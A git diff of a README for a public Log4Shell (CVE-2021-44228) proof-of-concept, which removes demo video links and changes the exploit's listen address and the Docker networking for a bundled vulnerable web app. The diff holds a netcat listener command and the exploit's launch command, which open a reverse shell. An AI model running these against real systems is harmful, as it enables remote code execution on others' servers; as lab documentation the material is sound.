@@ -12,18 +12,6 @@ Vuln Web App:
 
 https://user-images.githubusercontent.com/87979263/146113359-20663eaa-555d-4d60-828d-a7f769ebd266.mp4
 
-<br>
-
-Ghidra (Old script):
-
-https://user-images.githubusercontent.com/87979263/145728478-b4686da9-17d0-4511-be74-c6e6fff97740.mp4
-
-<br>
-
-Minecraft PoC (Old script):
-
-https://user-images.githubusercontent.com/87979263/145681727-2bfd9884-a3e6-45dd-92e2-a624f29a8863.mp4
-
 
 Proof-of-concept (POC)
 ----------------------
@@ -45,7 +33,7 @@ nc -lvnp 9001
 * Launch the exploit.<br>
 **Note:** For this to work, the extracted java archive has to be named: `jdk1.8.0_20`, and be in the same directory.
 ```py
-$ python3 poc.py --userip localhost --webport 8000 --lport 9001
+$ python3 poc.py --userip 0.0.0.0 --webport 8000 --lport 9001
 
 [!] CVE: CVE-2021-44228
 [!] Github repo: https://github.com/kozmer/log4j-shell-poc
@@ -69,7 +57,7 @@ Our vulnerable application
 We have added a Dockerfile with the vulnerable webapp. You can use this by following the steps below:
 ```c
 1: docker build -t log4j-shell-poc .
-2: docker run --network host log4j-shell-poc
+2: docker run -p 8080:8080 log4j-shell-poc
 ```
 Once it is running, you can access it on localhost:8080
 
